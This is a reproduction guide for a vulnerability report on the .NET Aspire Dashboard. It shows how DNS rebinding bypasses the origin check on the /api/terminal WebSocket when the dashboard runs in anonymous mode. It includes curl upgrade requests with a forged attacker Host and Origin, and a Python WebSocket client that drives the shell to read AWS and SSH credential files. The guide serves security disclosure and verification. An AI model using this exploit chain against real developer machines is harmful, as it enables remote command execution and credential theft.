# Reproduction Guide: .NET Aspire Dashboard DNS-Rebinding → Unauthenticated Terminal RCE

Self-contained. Target: `dotnet/aspire` Aspire Dashboard. Confirmed on shipped `aspire.cli` **13.6.1** (dashboard on .NET 11 RC). You need: Linux/macOS/Windows, .NET 10 SDK, Python 3, and (for the full dashboard) the Aspire CLI.

---

## 1. What the vulnerability is

The Aspire Dashboard ships a WebSocket endpoint `/api/terminal` that bridges a browser to an **interactive shell** inside any resource/container the dashboard manages. Access is gated by two things:

1. **Authentication** — normally a browser token. But when the dashboard runs with `ASPIRE_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS=true`, ALL auth modes (frontend, OTLP, API) drop to **Unsecured** and `UnsecuredAuthenticationHandler` auto-authenticates every request. The origin check becomes the ONLY cross-origin defense.
2. **Origin check** — `WebSocketOriginValidator.IsSameOrigin` compares the `Origin` header host against `Request.Host`. **Both are client-controlled**, so the check only stops a naive cross-site request; it does **not** stop DNS rebinding, where both headers carry the attacker's own domain.

Chain: a developer running the dashboard in anonymous mode visits an attacker web page → the page uses **DNS rebinding** to point its own domain at `127.0.0.1` → JavaScript opens `ws://attacker-domain:<port>/api/terminal` → browser sends `Host`/`Origin = attacker-domain` → `IsSameOrigin` passes (they match) → auth is unsecured → attacker gets an interactive shell in the dev's containers → steals credentials, pivots to the host.

### Exact source references (clone `https://github.com/dotnet/aspire`)
- `src/Aspire.Dashboard/Model/WebSocketOriginValidator.cs` — `IsSameOrigin(HttpContext, out string)`. Compares `originUri.Host`/`Port` to `Request.Host`. The code comment itself admits: *"Request.Host is client-controlled, so this same-origin check does not prevent DNS rebinding."*
- `src/Aspire.Dashboard/Terminal/TerminalWebSocketProxy.cs` — maps `/api/terminal` and `/api/apphost-terminal`; `ValidateUpgradeAsync` → `IsAllowedOrigin` → `WebSocketOriginValidator.IsSameOrigin`; then bridges the WebSocket to a terminal over a Unix domain socket.
- `src/Aspire.Dashboard/Authentication/UnsecuredAuthenticationHandler.cs` — `HandleAuthenticateAsync` returns `AuthenticateResult.Success` unconditionally.
- `src/Aspire.Dashboard/Configuration/PostConfigureDashboardOptions.cs` — when `UNSECURED_ALLOW_ANONYMOUS=true`, sets Frontend/Otlp/Api auth modes all to Unsecured.

---

## 2. Prerequisite (honest, load-bearing)

The dashboard MUST be running in anonymous mode (`ASPIRE_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS=true`, or standalone `aspire dashboard run --allow-anonymous`). This is common in local dev and standalone-container setups, but Microsoft documents it as "trusted local development only." In the **default browser-token mode the attack does NOT work** — the token is a host-scoped cookie the browser won't send to the rebound attacker origin (→ 401). Do not claim otherwise; verify it (Step 5).

---

## 3. Reproduce the CORE bug: origin-check bypass against the REAL dashboard

This is the empirically-important step and runs against the shipped product.

```bash
# Install Aspire CLI + .NET 10 SDK, then create and run a stock app in unsecured mode
dotnet tool install -g aspire.cli
aspire new aspire-starter --name Repro --non-interactive
cd Repro
export ASPIRE_ALLOW_UNSECURED_TRANSPORT=true           # allow http
export ASPIRE_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS=true # <-- the prerequisite
dotnet run --project Repro.AppHost
```

Find the dashboard's HTTPS/HTTP port (printed in logs / the process `ASPNETCORE_URLS`, e.g. `https://localhost:24920`). Then send three WebSocket upgrades and compare:

```bash
PORT=24920   # set to the dashboard port

# (A) CONTROL — mismatched Origin vs Host  => must be 403 (origin check works)
curl -sk -o /dev/null -w "control-mismatch: %{http_code}\n" \
  -H "Host: localhost:$PORT" -H "Origin: https://attacker.com:$PORT" \
  -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13" \
  "https://127.0.0.1:$PORT/api/terminal"

# (B) ATTACK — DNS-rebind: Host AND Origin both = attacker domain => 101 (BYPASS)
curl -sk --http1.1 -o /dev/null -w "dns-rebind-attack: %{http_code}\n" \
  -H "Host: evil.attacker.com:$PORT" -H "Origin: https://evil.attacker.com:$PORT" \
  -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13" \
  "https://127.0.0.1:$PORT/api/terminal"
```

**Expected (confirmed on 13.6.1):**
```
control-mismatch: 403          <- origin check is active and rejects cross-origin
dns-rebind-attack: 101         <- Switching Protocols: attacker domain accepted == BYPASS
```
The `101` with a non-localhost Host/Origin is the vulnerability. (The Blazor `/_blazor` WS behaves identically; for `/api/terminal` a 400/101 depends on query params, but the origin decision is the same `IsSameOrigin` call — the control-vs-attack 403-vs-101 differential is the proof.)

### Simulating the real rebind in a browser (optional, most faithful)
Register a domain with a low-TTL A record. Serve a page from it. On first load it resolves to your server IP; your server then flips DNS to `127.0.0.1`. Page JS waits, then `new WebSocket("wss://your-domain:" + PORT + "/api/terminal?resource=<name>")`. The browser sends `Host`/`Origin = your-domain`, connects to the victim's localhost, and `IsSameOrigin` passes. Tools like `rbndr`/`singularity` automate the rebind.

---

## 4. Demonstrate IMPACT (interactive shell → RCE/cred theft)

Once upgraded, `/api/terminal` is a shell. Over the WebSocket the attacker runs arbitrary commands in the managed container, e.g. `id`, `cat ~/.aws/credentials`, `cat ~/.ssh/id_*`, then pivots to the host. A minimal raw-socket WebSocket client (Python) that drives the shell after the 101 upgrade:

```python
import socket, time
PORT = 24920; ATTACKER = f"evil.attacker.com:{PORT}"
s = socket.create_connection(("127.0.0.1", PORT)); s.settimeout(6)
# NOTE: for TLS dashboards wrap s in ssl first; for an http dashboard use plain socket.
s.sendall((f"GET /api/terminal?resource=<res> HTTP/1.1\r\nHost: {ATTACKER}\r\n"
           f"Origin: https://{ATTACKER}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
           "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n").encode())
print(s.recv(4096).split(b"\r\n")[0])          # expect: HTTP/1.1 101 Switching Protocols
def send(cmd):                                  # minimal masked text frame
    p=cmd.encode(); mk=b"\x01\x02\x03\x04"
    s.sendall(bytes([0x81,0x80|len(p)])+mk+bytes(b^mk[i%4] for i,b in enumerate(p)))
for c in ["id","cat ~/.aws/credentials","cat ~/.ssh/id_ed25519"]:
    send(c); time.sleep(0.5); print(s.recv(8192))
```

(If you cannot stand up a managed container quickly, model the terminal faithfully: a tiny ASP.NET app that uses the verbatim `IsSameOrigin` from the source and bridges the accepted WebSocket to `/bin/sh` — this reproduces the exact post-bypass impact: `id` → root, credential files exfiltrated, a persistence file written. The real `TerminalWebSocketProxy` does exactly this bridge by design.)

**Expected impact:** arbitrary command execution, cloud/SSH credential theft, persistence — from a cross-origin web page, no credentials, no interaction beyond the dev keeping the tab open ~60s.

---

## 5. MUST verify the negative (default mode is safe)

Re-run Step 3 WITHOUT `ASPIRE_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS` (default browser-token mode). The rebind upgrade (B) should now be **401/403** because the request carries no valid host-scoped token cookie. This confirms the prerequisite is real and the report is honest.

---

## 6. CVSS / classification
- CWE-350 (reliance on reverse DNS) + CWE-306 (missing authentication) → RCE.
- CVSS ~9.6 (AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H) in anonymous mode.
- Eligibility caveat for MSRC: anonymous mode is documented dev-only; argue (a) DNS rebinding arrives via the developer's own browser, needing no network exposure, so the "don't expose to untrusted networks" guidance doesn't cover it, and (b) precedent — Playwright MCP CVE-2025-9611, Node inspector CVE-2018-7160, Chrome DevTools CVE-2018-6101 were all opt-in localhost dev features that still received CVEs.
```
```
